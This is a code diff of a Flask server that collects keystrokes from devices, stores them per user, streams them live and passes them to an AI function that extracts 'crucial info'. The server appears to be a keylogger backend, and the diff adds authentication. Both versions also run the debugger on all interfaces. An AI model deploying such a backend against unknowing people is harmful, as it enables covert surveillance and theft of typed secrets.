@@ -1,246 +1,174 @@
-# # server.py
-
-# from flask import Flask, request, jsonify, render_template, Response
-# import threading
-# import time
-# import os
-# from ai_analysis import analyze_keystrokes  # Import the AI analysis function
-# import google.generativeai as genai
-
-# app = Flask(__name__)
-
-# GOOGLE_API_KEY = 'your-google-api-key'
-# genai.configure(api_key=GOOGLE_API_KEY) #INPUT : Simulate the typing process from the provided keystroke log and output ONLY the final, intended text. Disregard all non-printing keystrokes, including but not limited to backspace, arrow keys, modifier keys, and function keys. The output should represent exactly what would be displayed on the screen after the entire sequence of keystrokes is processed
-
-# logs_dir = "user_logs/"  # Directory to store user logs
-
-# if not os.path.exists(logs_dir):
-#     os.makedirs(logs_dir)
-
-# logged_keys = {}
-# live_keys = {}
-
-# def get_user_log_file(username):
-#     return os.path.join(logs_dir, f"{username}_keylog.txt")
-
-# @app.route('/')
-# def index():
-#     return render_template('index.html')
-
-# @app.route('/log', methods=['POST'])
-# def log():
-#     data = request.json
-#     device_info = data["device_info"]
-#     key_data = data["key_data"]
-
-#     username = device_info['username']
-#     user_log_file = get_user_log_file(username)
-
-#     with open(user_log_file, "a") as f:
-#         if key_data == "<enter>":
-#             f.write("\n")
-#         else:
-#             f.write(key_data)
-
-#     if username not in logged_keys:
-#         logged_keys[username] = []
-#     if username not in live_keys:
-#         live_keys[username] = []
-
-#     logged_keys[username].append(key_data)
-#     live_keys[username].append(key_data)
-
-#     return jsonify(status="success", message="Keystroke logged successfully")
-
-# @app.route('/logs/<user>', methods=['GET'])
-# def get_logs(user):
-#     user_log_file = get_user_log_file(user)
-#     try:
-#         with open(user_log_file, "r") as f:
-#             logs = f.readlines()
-#     except FileNotFoundError:
-#         logs = []
-
-#     return jsonify(status="success", logs=logs)
-
-# @app.route('/users', methods=['GET'])
-# def get_users():
-#     return jsonify(status="success", users=list(logged_keys.keys()))
-
-# @app.route('/clear_logs/<user>', methods=['DELETE'])
-# def clear_logs(user):
-#     user_log_file = get_user_log_file(user)
-#     try:
-#         os.remove(user_log_file)
-#         logged_keys.pop(user, None)
-#         live_keys.pop(user, None)
-#         return jsonify(status="success", message=f"Logs cleared for {user}")
-#     except Exception as e:
-#         return jsonify(status="error", message=str(e))
-
-# @app.route('/log_status', methods=['GET'])
-# def log_status():
-#     return jsonify(status="running")
-
-# @app.route('/view_logs/<user>')
-# def view_logs(user):
-#     logs = {}
-#     user_logs_file = get_user_log_file(user)
-
-#     if os.path.exists(user_logs_file):
-#         try:
-#             with open(user_logs_file, 'r') as file:
-#                 logs_content = file.readlines()
-#                 logs[user] = logs_content
-#         except Exception as e:
-#             print(f"Error reading log file for {user}: {e}")
-#             logs = {}
-#     else:
-#         print(f"Log file not found for {user}")
-#         logs = {}
-
-#     return render_template('view_logs.html', user=user, logs=logs)
-
-
-# @app.route('/live_logs/<user>')
-# def live_logs(user):
-#     return render_template('live_logs.html', user=user)
-
-# @app.route('/live_logs_stream/<user>')
-# def live_logs_stream(user):
-#     def generate():
-#         while True:
-#             if user in live_keys:
-#                 while live_keys[user]:
-#                     key = live_keys[user].pop(0)
-#                     yield f"data: {key}\n\n"
-#             time.sleep(0.1)
-#     return Response(generate(), mimetype="text/event-stream")
-
-# @app.route('/analyze/<user>', methods=['GET'])
-# def analyze(user):
-#     user_log_file = get_user_log_file(user)
-#     try:
-#         with open(user_log_file, "r") as f:
-#             logs = f.read()
-#     except FileNotFoundError:
-#         logs = ""
-
-#     crucial_info = analyze_keystrokes(logs)
-#     return jsonify(status="success", crucial_info=crucial_info)
-    
-
-# if __name__ == "__main__":
-#     app.run(host='0.0.0.0', port=5000, debug=True)
-
-
-from flask import Flask, request, jsonify, render_template, Response
-import threading
-import time
+from flask import Flask, request, jsonify, render_template, Response, g
+import sqlite3
 import os
-from ai_analysis import analyze_keystrokes  # Import the AI analysis function
-import google.generativeai as genai
+import time
+from functools import wraps
+from werkzeug.security import generate_password_hash, check_password_hash
+from ai_analysis import analyze_keystrokes
 
 app = Flask(__name__)
 
-GOOGLE_API_KEY = 'your-google-api-key'
-genai.configure(api_key=GOOGLE_API_KEY) #INPUT : Simulate the typing process from the provided keystroke log and output ONLY the final, intended text. Disregard all non-printing keystrokes, including but not limited to backspace, arrow keys, modifier keys, and function keys. The output should represent exactly what would be displayed on the screen after the entire sequence of keystrokes is processed
+DATABASE = os.path.join(os.path.dirname(__file__), 'logs.db')
 
-logs_dir = "user_logs/"  # Directory to store user logs
+# ---------------------- Database Helpers ----------------------
 
-if not os.path.exists(logs_dir):
-    os.makedirs(logs_dir)
+def get_db():
+    db = getattr(g, '_database', None)
+    if db is None:
+        db = g._database = sqlite3.connect(DATABASE)
+        db.row_factory = sqlite3.Row
+    return db
 
-logged_keys = {}
+@app.teardown_appcontext
+def close_connection(exception):
+    db = getattr(g, '_database', None)
+    if db is not None:
+        db.close()
+
+def init_db():
+    db = get_db()
+    cursor = db.cursor()
+    cursor.execute(
+        'CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY AUTOINCREMENT, '
+        'username TEXT UNIQUE NOT NULL, password TEXT NOT NULL)'
+    )
+    cursor.execute(
+        'CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, '
+        'user_id INTEGER NOT NULL, log TEXT NOT NULL, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP, '
+        'FOREIGN KEY(user_id) REFERENCES users(id))'
+    )
+    db.commit()
+
+# Initialize database when the server starts
+with app.app_context():
+    init_db()
+
+# ---------------------- Authentication ----------------------
+
+def get_user(username):
+    cur = get_db().execute('SELECT * FROM users WHERE username=?', (username,))
+    return cur.fetchone()
+
+def check_auth(username, password):
+    user = get_user(username)
+    if user and check_password_hash(user['password'], password):
+        g.user = user
+        return True
+    return False
+
+def authenticate():
+    resp = jsonify({'message': 'Authentication required'})
+    resp.status_code = 401
+    resp.headers['WWW-Authenticate'] = 'Basic realm="Login Required"'
+    return resp
+
+def requires_auth(f):
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        auth = request.authorization
+        if not auth or not check_auth(auth.username, auth.password):
+            return authenticate()
+        return f(*args, **kwargs)
+    return decorated
+
+# ---------------------- Routes ----------------------
+
 live_keys = {}
-
-def get_user_log_file(username):
-    return os.path.join(logs_dir, f"{username}_keylog.txt")
 
 @app.route('/')
 def index():
     return render_template('index.html')
 
-@app.route('/log', methods=['POST'])
-def log():
+@app.route('/register', methods=['POST'])
+def register():
     data = request.json
-    device_info = data["device_info"]
-    key_data = data["key_data"]
+    username = data.get('username')
+    password = data.get('password')
+    if not username or not password:
+        return jsonify({'status': 'error', 'message': 'username and password required'}), 400
+    db = get_db()
+    try:
+        db.execute('INSERT INTO users (username, password) VALUES (?, ?)',
+                   (username, generate_password_hash(password)))
+        db.commit()
+    except sqlite3.IntegrityError:
+        return jsonify({'status': 'error', 'message': 'user already exists'}), 400
+    return jsonify({'status': 'success', 'message': 'user registered'})
 
-    username = device_info['username']
-    user_log_file = get_user_log_file(username)
+@app.route('/log', methods=['POST'])
+@requires_auth
+def log():
+    data = request.json or {}
+    key_data = data.get('key_data', '')
+    user_id = g.user['id']
 
-    with open(user_log_file, "a") as f: # this is the part to alter the data entry into the user file that is being logged 
-        if key_data == "<enter>":
-            f.write("\n")
-        else:
-            f.write(key_data)
+    db = get_db()
+    db.execute('INSERT INTO logs (user_id, log) VALUES (?, ?)', (user_id, key_data))
+    db.commit()
 
-    if username not in logged_keys:
-        logged_keys[username] = []
+    username = g.user['username']
     if username not in live_keys:
         live_keys[username] = []
-
-    logged_keys[username].append(key_data)
     live_keys[username].append(key_data)
 
-    return jsonify(status="success", message="Keystroke logged successfully")
+    return jsonify({'status': 'success', 'message': 'Keystroke logged successfully'})
 
 @app.route('/logs/<user>', methods=['GET'])
+@requires_auth
 def get_logs(user):
-    user_log_file = get_user_log_file(user)
-    try:
-        with open(user_log_file, "r") as f:
-            logs = f.readlines()
-    except FileNotFoundError:
-        logs = []
-
-    return jsonify(status="success", logs=logs)
+    if g.user['username'] != user:
+        return jsonify({'status': 'error', 'message': 'forbidden'}), 403
+    db = get_db()
+    cur = db.execute('SELECT log FROM logs WHERE user_id=? ORDER BY id', (g.user['id'],))
+    logs = [row['log'] for row in cur.fetchall()]
+    return jsonify({'status': 'success', 'logs': logs})
 
 @app.route('/users', methods=['GET'])
 def get_users():
-    return jsonify(status="success", users=list(logged_keys.keys()))
+    db = get_db()
+    cur = db.execute('SELECT username FROM users')
+    users = [row['username'] for row in cur.fetchall()]
+    return jsonify({'status': 'success', 'users': users})
 
 @app.route('/clear_logs/<user>', methods=['DELETE'])
+@requires_auth
 def clear_logs(user):
-    user_log_file = get_user_log_file(user)
-    try:
-        os.remove(user_log_file)
-        logged_keys.pop(user, None)
-        live_keys.pop(user, None)
-        return jsonify(status="success", message=f"Logs cleared for {user}")
-    except Exception as e:
-        return jsonify(status="error", message=str(e))
+    if g.user['username'] != user:
+        return jsonify({'status': 'error', 'message': 'forbidden'}), 403
+    db = get_db()
+    db.execute('DELETE FROM logs WHERE user_id=?', (g.user['id'],))
+    db.commit()
+    live_keys.pop(user, None)
+    return jsonify({'status': 'success', 'message': f'Logs cleared for {user}'})
 
 @app.route('/log_status', methods=['GET'])
 def log_status():
-    return jsonify(status="running")
+    return jsonify({'status': 'running'})
 
 @app.route('/view_logs/<user>')
+@requires_auth
 def view_logs(user):
-    logs = {}
-    user_logs_file = get_user_log_file(user)
-
-    if os.path.exists(user_logs_file):
-        try:
-            with open(user_logs_file, 'r') as file:
-                logs_content = file.readlines()
-                logs[user] = logs_content
-        except Exception as e:
-            print(f"Error reading log file for {user}: {e}")
-            logs = {}
-    else:
-        print(f"Log file not found for {user}")
-        logs = {}
-
-    return render_template('view_logs.html', user=user, logs=logs)
+    if g.user['username'] != user:
+        return jsonify({'status': 'error', 'message': 'forbidden'}), 403
+    db = get_db()
+    cur = db.execute('SELECT log FROM logs WHERE user_id=? ORDER BY id', (g.user['id'],))
+    logs = [row['log'] for row in cur.fetchall()]
+    logs_dict = {user: logs}
+    return render_template('view_logs.html', user=user, logs=logs_dict)
 
 @app.route('/live_logs/<user>')
+@requires_auth
 def live_logs(user):
+    if g.user['username'] != user:
+        return jsonify({'status': 'error', 'message': 'forbidden'}), 403
     return render_template('live_logs.html', user=user)
 
 @app.route('/live_logs_stream/<user>')
+@requires_auth
 def live_logs_stream(user):
+    if g.user['username'] != user:
+        return jsonify({'status': 'error', 'message': 'forbidden'}), 403
+
     def generate():
         while True:
             if user in live_keys:
@@ -248,20 +176,18 @@ def live_logs_stream(user):
                     key = live_keys[user].pop(0)
                     yield f"data: {key}\n\n"
             time.sleep(0.1)
-    return Response(generate(), mimetype="text/event-stream")
+    return Response(generate(), mimetype='text/event-stream')
 
 @app.route('/analyze/<user>', methods=['GET'])
+@requires_auth
 def analyze(user):
-    user_log_file = get_user_log_file(user)
-    try:
-        with open(user_log_file, "r") as f:
-            logs = f.read()
-    except FileNotFoundError:
-        logs = ""
-
+    if g.user['username'] != user:
+        return jsonify({'status': 'error', 'message': 'forbidden'}), 403
+    db = get_db()
+    cur = db.execute('SELECT log FROM logs WHERE user_id=? ORDER BY id', (g.user['id'],))
+    logs = ''.join(row['log'] for row in cur.fetchall())
     crucial_info = analyze_keystrokes(logs)
-    return jsonify(status="success", crucial_info=crucial_info)
+    return jsonify({'status': 'success', 'crucial_info': crucial_info})
 
-
-if __name__ == "__main__":
+if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8080, debug=True)
